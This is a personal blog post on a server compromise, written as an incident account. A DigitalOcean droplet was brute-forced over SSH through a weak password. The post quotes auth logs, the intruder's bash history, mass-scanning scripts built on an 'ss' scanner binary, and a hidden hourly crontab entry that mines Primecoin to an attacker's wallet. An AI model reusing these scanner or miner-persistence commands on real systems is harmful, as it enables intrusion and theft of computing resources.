<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="description" content="I got an email from DigitalOcean yesterday that looked pretty alarming: Please review the following abuse complaint and provide us with a resolution: We have noticed suspicious activity from...">
        <meta name="keywords" content="digitalocean, security, unix">
        <link rel="icon" href="/favicon.ico">

        <title>Don't use '1234' as your password - mohcine's super blog</title>

        <!-- Stylesheets -->
        <link href="/theme/css/all.min.css" rel="stylesheet">
        <!-- /Stylesheets -->

        <!-- RSS Feeds -->
        <!-- /RSS Feeds -->

        <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
        <!--[if lt IE 9]>
          <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
          <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
        <![endif]-->



    </head>

    <body>

        <!-- Header -->
    <div class="header-container gradient">

            <!-- Static navbar -->
            <div class="container">
                <div class="header-nav">
                    <div class="header-logo">
                        <a class="pull-left" href="/"><img class="mr20" src="/image/logo.png" alt="logo">mohcine's super blog</a>
                    </div>
                    <div class="nav pull-right">
                                <a href="/">Homepage</a>
                                <a href="/categories.html">Categories</a>
                            <a  href="/pages/about.html">About</a>
                    </div>
                </div>
            </div>
            <!-- /Static navbar -->

            <!-- Header -->
    <!-- Header -->
    <div class="container header-wrapper">
        <div class="row">
              <div class="col-lg-12">
                  <div class="header-content">
                      <h1 class="header-title">Don't use '1234' as your password</h1>
                      <p class="header-date">By <a href="/author/mohcine-madkour.html">mohcine madkour</a>, Sun 17 November 2013, in category <a href="/category/misc.html">Misc</a></p>
                      <div class="header-underline"></div>
                      <div class="clearfix"></div>
                      <p class="pull-right header-tags">
                          <span class="glyphicon glyphicon-tags mr5" aria-hidden="true"></span>
<a href="/tag/digitalocean.html">digitalocean</a>, <a href="/tag/security.html">security</a>, <a href="/tag/unix.html">unix</a>                      </p>
                  </div>
              </div>
        </div>
    </div>
    <!-- /Header -->
            <!-- /Header -->

        </div>
        <!-- /Header -->


        <!-- Content -->
    <div class="container content">
        <p>I got an email from DigitalOcean yesterday that looked pretty alarming:</p>
<blockquote>
<p>Please review the following abuse complaint and provide us with a resolution:</p>
<p>We have noticed suspicious activity from 198.199.81.92 aimed at one of our servers. Please investigate this host and disable whichever exploit or malware is causing this activity. For more information or questions please refer to our website located at http://www.abuse.bz/
Here are our raw logs: </p>
<p>[2013-11-16 04:23:14 CET] [Timestamp: 1384572194] [10470236.419446] Firewall: <em>TCP_IN Blocked</em> IN=eth0 OUT= SRC=198.199.81.92 DST=37.148.161.251 LEN=48 TOS=0x00 PREC=0x00 TTL=116 ID=22480 PROTO=TCP SPT=65529 DPT=5038 WINDOW=65535 RES=0x00 SYN URGP=0</p>
<p>[2013-11-16 04:23:14 CET] [Timestamp: 1384572195] [10470236.491926] Firewall: <em>TCP_IN Blocked</em> IN=eth0 OUT= SRC=198.199.81.92 DST=37.148.162.251 LEN=48 TOS=0x00 PREC=0x00 TTL=117 ID=4984 PROTO=TCP SPT=65529 DPT=5038 WINDOW=65535 RES=0x00 SYN URGP=0</p>
<p>[2013-11-16 04:23:14 CET] [Timestamp: 1384572195] [10470236.600632] Firewall: <em>TCP_IN Blocked</em> IN=eth0 OUT= SRC=198.199.81.92 DST=37.148.163.251 LEN=48 TOS=0x00 PREC=0x00 TTL=116 ID=20240 PROTO=TCP SPT=65529 DPT=5038 WINDOW=65535 RES=0x00 SYN URGP=0 </p>
<p>Please note that generating multiple abuse complaints in a short period of time may lead to your account being suspended.</p>
</blockquote>
<p>I had no idea what they were talking about, so I asked them what that meant. They responded with:</p>
<blockquote>
<p>This report indicates that your droplet is sending unauthorized traffic to the complaining party. The traffic seems to originate from TCP Port 65529 on your droplet. Please investigate what service or application this may be, and cease the activity.</p>
</blockquote>
<p>I had no idea what happened, so I logged into my box and checked my processes. Turns out there was some strange processes running -  <code>ss</code> and <code>screen</code> - taking up all of my cpu. I didn't know what <code>ss</code> was so I killed it, and cpu usage dropped back to 0. Weird. I checked my usage graphs on DigitalOcean, and I saw something weirder.</p>
<p><a href="/images/droplet-stats.png"><img alt="Madness" src="/images/droplet-stats.png"></a></p>
<p>What the fuck is this? This is very suspicious indeed. I did a quick search for ss and screen, and found <a href="http://www.shellperson.net/hacked-ssh-bruteforce/">this guy</a> who had gotten ssh bruteforced. It looks like the same thing happened to me. But wait, I said, I know how to use the Internet. I know how passwords work. I'm better than this. I never get hacked.</p>
<p>Then I realized what the password on one of my accounts was. <strong>1234</strong>.</p>
<h3>Digging around</h3>
<p>Looking through my <code>/var/log/auth.log</code>, I saw a <em>lot</em> of this:</p>
<div class="highlight"><pre><span></span>Address 85.232.244.50 maps to gamepad.pl, but this does not map back to the address - POSSIBLE BREAK-IN ATTEMPT!
Invalid user fskjl32l32 from 85.232.244.50
Address 85.232.244.50 maps to gamepad.pl, but this does not map back to the address - POSSIBLE BREAK-IN ATTEMPT!
Invalid user abc from 85.232.244.50
Address 85.232.244.50 maps to gamepad.pl, but this does not map back to the address - POSSIBLE BREAK-IN ATTEMPT!
Invalid user abc123 from 85.232.244.50
</pre></div>


<p>So, as expected, my box was constantly being bruteforced. The only reason I lasted 5 months is because I'm using key-based login on <code>root</code>, and I'm not using common usernames like <code>test</code> or <code>user</code>. I did a search for successful logins by password:</p>
<div class="highlight"><pre><span></span>root@poop:/var/log# grep -ri &quot;accepted password&quot; auth.log*
auth.log.3:Nov  1 06:54:24 localhost sshd[3283]: Accepted password for wang from 88.146.181.101 port 46790 ssh2
auth.log.1:Nov  3 15:58:13 localhost sshd[8964]: Accepted password for wang from 88.146.181.101 port 43976 ssh2
</pre></div>


<p>And there it is. The <code>wang</code> user happens to be a sudoer, too. This guy first got in more than 2 weeks ago. What other users did he try?</p>
<div class="highlight"><pre><span></span>root@poop:/var/log# grep -ri &quot;88.146.181.101&quot; auth.log*
auth.log.3:Nov  1 06:54:24 localhost sshd[3283]: Accepted password for wang from 88.146.181.101 port 46790 ssh2
auth.log.2:Nov  3 15:58:13 localhost sshd[8964]: Accepted password for wang from 88.146.181.101 port 43976 ssh2
auth.log.2:Nov  3 16:11:35 localhost sshd[9856]: Invalid user a from 88.146.181.101
auth.log.2:Nov  3 16:11:35 localhost sshd[9856]: Failed none for invalid user a from 88.146.181.101 port 43992 ssh2
auth.log.2:Nov  4 01:39:37 localhost sshd[505]: Failed password for root from 88.146.181.101 port 48730 ssh2
auth.log.2:Nov  5 01:57:59 localhost sshd[27299]: Failed password for root from 88.146.181.101 port 33949 ssh2
</pre></div>


<p>Hmm, not that many actually. However, my logs only go back to October 27, so he was probably trying for a while before he found a valid user. <code>88.146.181.101</code> is based in the Czech Republic, but that may just be another compromised machine.</p>
<h3>The damage</h3>
<p>I checked my bash history but could only find this section that wasn't me:</p>
<div class="highlight"><pre><span></span>screen -r
screen -wipe
ls -a
<span class="nb">cd</span> /var/www
ls
<span class="nb">cd</span> /var/opt
ls
ls -a
<span class="nb">cd</span>
<span class="nb">cd</span> .cpan
ls
<span class="nb">cd</span> lin
ls -a
<span class="nb">cd</span> .kde
ls
rm -rf bios.txt
screen
ls
./0-50<span class="p">;</span>./100-150<span class="p">;</span>./150-200<span class="p">;</span>./200-255<span class="p">;</span>./50-100
</pre></div>


<p>I also noticed a couple of <code>screen -r</code>'s dispersed throughout, so the attacker may have done other bad things on my system that I don't know about. On my <code>/root/</code> folder, I found a <code>.cpan/</code> folder, inside containing some perl stuff and some build stuff. And of course, the bag of goodies containing treats like ddos and ssh bruteforce. Here are the contents of the script folder:</p>
<div class="highlight"><pre><span></span>root@poop:~/.cpan/lin/.kde# ls -lh
total 5.3M
-rw-r--r-x 1 bin  bin  1.6K Nov  9 05:39 0-50
-rw-r--r-- 1 root root 1.8M Nov 16 12:31 0-50.txt
-rw-r--r-x 1 bin  bin  1.6K Nov  9 05:39 100-150
-rw-r--r-x 1 bin  bin  1.6K Nov  9 05:38 150-200
-rw-r--r-x 1 bin  bin  1.6K Nov  9 05:37 200-255
-rw-r--r-x 1 bin  bin  1.6K Nov  9 05:38 50-100
-rw-r--r-- 1 root root 2.9M Nov 16 20:34 bios.txt
-rw-r--r-x 1 bin  bin   16K Feb 20  2009 s
-rw-r--r-x 1 bin  bin  245K Feb 13  2001 screen
-rw------x 1 bin  bin  444K Jan 19  2007 ss
</pre></div>


<p>The contents of the numbered scripts were all the same:</p>
<div class="highlight"><pre><span></span>./ss 5038 -a 1 -i eth0 -s 10
./ss 5038 -a 2 -i eth0 -s 10
./ss 5038 -a 3 -i eth0 -s 10

...

./ss 5038 -a 48 -i eth0 -s 10
./ss 5038 -a 49 -i eth0 -s 10
./ss 5038 -a 50 -i eth0 -s 10
cat bios.txt |sort|uniq &gt;&gt; 0-50.txt
rm -rf bios.txt
</pre></div>


<p><code>bios.txt</code> was a long list of ips to target, and the <code>s</code>, <code>ss</code>, and <code>screen</code> files were binaries. It looks like the scripts scan the list of ips for ssh vulnerabilities, so the attacker can try to break into <em>those ips</em> and presumably do the same exact thing, over and over again.</p>
<h3>Seriously? Primecoin?</h3>
<p>I also found this treat in my crontab:</p>
<div class="highlight"><pre><span></span>@hourly export LD_LIBRARY_PATH=/tmp/.ICE-unix/-log/lib;cd /tmp/.ICE-unix/-log/primecoind -datadir=/tmp/.ICE-unix/-log/.primecoin sendtoaddress Ad6ivkTLTxMmBa2iWGFJp8wJkVMhhL6hDp 10 &gt;/dev/null 2&gt;&amp;1
</pre></div>


<p>Well, that explains the 100% cpu load. This guy was mining <a href="https://github.com/primecoin/primecoin">primecoin</a> and sending the coins to himself. Inside that <code>.primecoin</code> folder was the Primecoin client and wallet.dat file. Sadly, there was nothing in the wallet, though I'm not sure how effective my tiny instance is at hashing.</p>
<h3>Good bye, poor instance</h3>
<p>Fortunately, the attacker didn't mess with my data or personal files, and nothing on that machine was super private. He could have redirected my site to a bad one, or served viruses directly. I wouldn't even have known. This attack was probably the work of some bored script kiddie somewhere, seeing as he didn't modify the bash history or limit the cpu/network usage to remain undetected. The damage done was minimal, and I got a good learning experience out of it.</p>
<p>After I told DigitalOcean what happened, they recommended me to destroy my instance. I copied all the things I didn't already have on github to my local machine, booted up a new droplet, and set that one up. And, this time, I chose a better password than 1234.</p>


        
    </div>
        <!-- /Content --> 

        <!-- Footer -->
        <div class="footer gradient-2">
            <div class="container footer-container ">
                <div class="row">
                    <div class="col-xs-4 col-sm-3 col-md-3 col-lg-3">
                        <div class="footer-title">Sitemap</div>
                        <ul class="list-unstyled">
                            <li><a href="/archives.html">Archives</a></li>
                            <li><a href="/tags.html">Tags</a></li>
                            <li><a href="/authors.html">Authors</a></li>
                        </ul>
                    </div>
                    <div class="col-xs-4 col-sm-3 col-md-3 col-lg-3">
                        <div class="footer-title">Social</div>
                        <ul class="list-unstyled">
                            <li><a href="#" target="_blank">You can add links in your config file</a></li>
                            <li><a href="#" target="_blank">Another social link</a></li>
                        </ul>
                    </div>
                    <div class="col-xs-4 col-sm-3 col-md-3 col-lg-3">
                        <div class="footer-title">Links</div>
                        <ul class="list-unstyled">
                            <li><a href="http://getpelican.com/" target="_blank">Pelican</a></li>
                            <li><a href="http://python.org/" target="_blank">Python.org</a></li>
                            <li><a href="http://jinja.pocoo.org/" target="_blank">Jinja2</a></li>
                            <li><a href="#" target="_blank">You can modify those links in your config file</a></li>
                        </ul>
                    </div> 
                    <div class="col-xs-12 col-sm-3 col-md-3 col-lg-3">
                        <p class="pull-right text-right">
                            <small><em>Proudly powered by <a href="http://docs.getpelican.com/" target="_blank">pelican</a></em></small><br/>
                            <small><em>Theme and code by <a href="https://github.com/molivier" target="_blank">molivier</a></em></small><br/>
                            <small>&copy; blogname 2015</small>
                        </p>
                    </div>
                </div>
            </div>
        </div>
        <!-- /Footer -->
    </body>
</html>